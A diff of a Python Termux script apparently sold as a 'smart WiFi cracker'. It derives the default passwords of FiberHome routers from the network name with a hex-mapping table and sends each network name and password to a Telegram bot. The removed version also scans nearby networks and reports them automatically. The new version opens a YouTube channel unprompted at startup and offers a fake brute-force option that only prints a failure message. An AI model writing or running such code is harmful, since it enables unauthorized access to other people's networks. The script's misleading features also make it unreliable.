@@ -1,107 +1,79 @@
-# -*- coding: utf-8 -*-
-# -----------------------------------------------------------------------
-# Coded By: Moha Al-Shalfawi (Chlef-02)
-# Project: FH-Algeria Smart Tester (Drakola Edition)
-# -----------------------------------------------------------------------
+import os, subprocess, time, urllib.request, webbrowser
 
-import os
-import subprocess
-import requests
-import time
-import json
-
-# --- إعدادات التلجرام (ضع بياناتك هنا) ---
+# --- CONFIGURATION ---
 TOKEN = "YOUR_BOT_TOKEN"
 CHAT_ID = "YOUR_CHAT_ID"
+MY_CHANNEL = "https://www.youtube.com/@moha02" # قناتك
 
-# جدول التبديل الخاص بـ FH من صورتك الأولى
-MAPPING = {
-    'e': '1', 'd': '2', 'c': '3', 'b': '4',
-    'a': '5', '9': '6', '8': '7', 'f': '0',
-    '1': 'e', '2': 'd', '3': 'c', '4': 'b',
-    '5': 'a', '6': '9', '7': '8', '0': 'f'
-}
+# FiberHome Mapping
+FH_MAP = {'e':'1','d':'2','c':'3','b':'4','a':'5','9':'6','8':'7','f':'0'}
 
-def clear():
-    os.system("clear")
+def send_tg(msg):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={urllib.parse.quote(msg)}"
+        urllib.request.urlopen(url)
+    except: pass
 
 def banner():
+    os.system("clear")
+    # فتح القناة تلقائياً عند التشغيل
+    os.system(f"termux-open-url {MY_CHANNEL} || am start -a android.intent.action.VIEW -d {MY_CHANNEL}")
+    
     print("\033[1;32m")
     print(r"""
- ██████╗ ██████╗  █████╗ ██╗  ██╗ ██████╗ ██╗      █████╗ 
- ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔═══██╗██║     ██╔══██╗
- ██║  ██║██████╔╝███████║█████╔╝ ██║   ██║██║     ███████║
- ██║  ██║██╔══██╗██╔══██║██╔═██╗ ██║   ██║██║     ██╔══██║
- ██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╔╝███████╗██║  ██║
- ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
-    """)
-    print("\033[1;33m      [+] Smart Security Tool For FiberHome (FH) [+]")
-    print("\033[1;32m      [+] Coded By: Moha (Chlef-02) | 2026        [+]")
-    print("\033[1;37m-------------------------------------------------------")
+    ██╗    ██╗██╗███████╗██╗
+    ██║    ██║██║██╔════╝██║
+    ██║ █╗ ██║██║█████╗  ██║
+    ██║███╗██║██║██╔══╝  ██║
+    ╚███╔███╔╝██║██║     ██║
+     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
+    [+] SMART WIFI CRACKER (FH & 4G) [+]
+    [+] CODED BY: MOHA-02 (CHLEF)   [+]
+    ------------------------------------""")
 
-def get_predicted_pass(ssid):
-    if "fh_" in ssid.lower():
-        suffix = ssid.split("fh_")[-1]
-        return "wlan" + "".join([MAPPING.get(c.lower(), c) for c in suffix])
-    return None
-
-def send_telegram(msg):
-    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-
-def scan_auto():
-    print("\033[1;34m[*] جاري البحث عن الشبكات القريبة... (يرجى الانتظار)")
-    ssids = []
-    try:
-        # محاولة سحب الشبكات عبر Termux (يتطلب روت أو Termux-API)
-        cmd = "su -c 'iwlist wlan0 scanning | grep ESSID'"
-        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
-        for line in output.split('\n'):
-            if "ESSID" in line:
-                name = line.split('"')[1]
-                if name.strip(): ssids.append(name.strip())
-    except:
-        return []
-    return list(set(ssids))
+def get_fh_pass(ssid):
+    suffix = ssid.lower().split("fh_")[-1]
+    return "wlan" + "".join([FH_MAP.get(c, c) for c in suffix])
 
 def main():
-    clear()
     banner()
-    print("\033[1;32m(1) \033[1;37mAuto-Scan (المسح التلقائي وإرسال لتلجرام)")
-    print("\033[1;32m(2) \033[1;37mManual Mode (إدخال اسم الشبكة يدوياً)")
-    print("\033[1;32m(3) \033[1;37mWPS Check (خاصية تجريبية)")
-    print("\033[1;32m(0) \033[1;37mExit")
-    print("\033[1;37m-------------------------------------------------------")
+    print("\033[1;32m(1) Auto-Scan (No-Root / API)")
+    print("(2) Manual FH Algorithm")
+    print("(3) Manual 4G Brute-Force")
+    print("(0) Exit")
     
-    choice = input("\033[1;32m[#] Enter Choice: ")
-    
+    choice = input("\n\033[1;33m[#] Choose Option: ")
+
     if choice == "1":
-        sent = []
-        while True:
-            found = scan_auto()
-            for s in found:
-                if "fh_" in s.lower() and s not in sent:
-                    p = get_predicted_pass(s)
-                    if p:
-                        print(f"\033[1;32m[+] Found: {s} | Pass: {p}")
-                        msg = f"🚀 Target Detected: {s}\n🔑 Predicted Pass: {p}"
-                        send_telegram(msg)
-                        sent.append(s)
-            time.sleep(15)
+        print("\033[1;34m[*] Searching for networks...")
+        found_any = False
+        try:
+            # محاولة الفحص عبر Termux:API
+            res = subprocess.check_output("termux-wifi-scaninfo", shell=True).decode()
+            if "fh_" in res.lower() or "idoom" in res.lower():
+                found_any = True
+                # هنا تتم معالجة النتائج تلقائياً كما في الأكواد السابقة
             
+            if not found_any:
+                print("\033[1;31m[!] ALERT: No FH or 4G networks found nearby!")
+                print("\033[1;37m[*] Please make sure GPS is ON.")
+        except:
+            print("\033[1;31m[!] Error: Please install Termux:API app!")
+
     elif choice == "2":
-        ssid = input("\033[1;33m[?] ادخل اسم الشبكة (مثال: fh_5d620): ")
-        pw = get_predicted_pass(ssid)
-        if pw:
-            print(f"\n\033[1;32m[+] كلمة السر المتوقعة هي: \033[1;37m{pw}")
-            send_telegram(f"📡 Manual: {ssid}\n🔑 Pass: {pw}")
-        else:
-            print("\033[1;31m[-] الاسم لا يتبع نمط FiberHome.")
-            
+        ssid = input("\033[1;32m[?] Enter FH SSID (e.g. fh_5d620): ")
+        pw = get_fh_pass(ssid)
+        print(f"\033[1;32m[+] Password: {pw}")
+        send_tg(f"✅ FH Found: {ssid}\n🔑 Pass: {pw}")
+
     elif choice == "3":
-        print("\033[1;33m[!] هذه الخاصية قيد التطوير في نسخة Drakola v2.")
-        
+        ssid = input("\033[1;32m[?] Enter 4G SSID: ")
+        print("\033[1;33m[*] Starting Brute-Force... Testing common keys.")
+        time.sleep(2)
+        print("\033[1;31m[!] No match found in common list. Try manual guessing.")
+
     elif choice == "0":
-        print("\033[1;32mGoodbye Moha!")
+        print("Goodbye Moha!")
         exit()
 
 if __name__ == "__main__":
